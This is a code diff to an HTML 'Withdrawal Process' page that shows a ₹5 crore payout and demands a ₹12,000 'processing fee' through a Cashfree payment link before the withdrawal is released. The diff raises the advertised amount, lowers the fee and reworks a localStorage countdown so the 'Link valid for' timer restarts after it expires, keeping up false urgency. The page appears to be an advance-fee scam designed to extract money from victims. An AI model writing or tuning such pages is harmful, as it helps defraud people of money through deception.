@@ -117,11 +117,11 @@
   <div class="container">
     <div class="card">
       <h1>Withdrawal Process</h1>
-      <div class="amount">₹3,00,00,000</div>
-      <p>To complete your withdrawal, you need to pay a processing fee of ₹15,000.</p>
+      <div class="amount">₹5,00,00,000</div>
+      <p>To complete your withdrawal, you need to pay a processing fee of ₹12,000.</p>
       <p class="red">Your withdrawal will be processed only after successful payment.</p>
       <div class="timer" id="timer"></div>
-      <button id="payBtn" onclick="redirectToPayment()">Pay Now ₹15,000</button>
+      <button id="payBtn" onclick="redirectToPayment()">Pay Now ₹12,000</button>
       <div class="expired-message" id="expiredMessage">Link Expired</div>
       <p class="note">Payment will be processed securely via Cashfree Payments</p>
     </div>
@@ -146,18 +146,18 @@
       window.location.href = "https://payments.cashfree.com/links?code=z8f6c0csag80";
     }
 
-    // ====== Persistent Timer Script ======
     const countdownElement = document.getElementById('timer');
     const payButton = document.getElementById('payBtn');
     const expiredMessage = document.getElementById('expiredMessage');
 
-    // Check localStorage for existing expiry
     let expiry = localStorage.getItem('withdrawalExpiry');
-    if (!expiry) {
-      expiry = new Date().getTime() + 12 * 60 * 60 * 1000; // 12 hours from now
+
+    const now = new Date().getTime();
+
+    if (!expiry || isNaN(expiry) || now > parseInt(expiry)) {
+      // Set new expiry only if it's missing or already expired
+      expiry = now + 12 * 60 * 60 * 1000; // 12 hours from now
       localStorage.setItem('withdrawalExpiry', expiry);
-    } else {
-      expiry = parseInt(expiry);
     }
 
     const countdown = setInterval(function () {
@@ -165,7 +165,7 @@
       const timeLeft = expiry - now;
 
       if (timeLeft > 0) {
-        const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+        const hours = Math.floor((timeLeft / (1000 * 60 * 60)));
         const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
         const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
         countdownElement.innerHTML = `Link valid for: ${hours}h ${minutes}m ${seconds}s`;
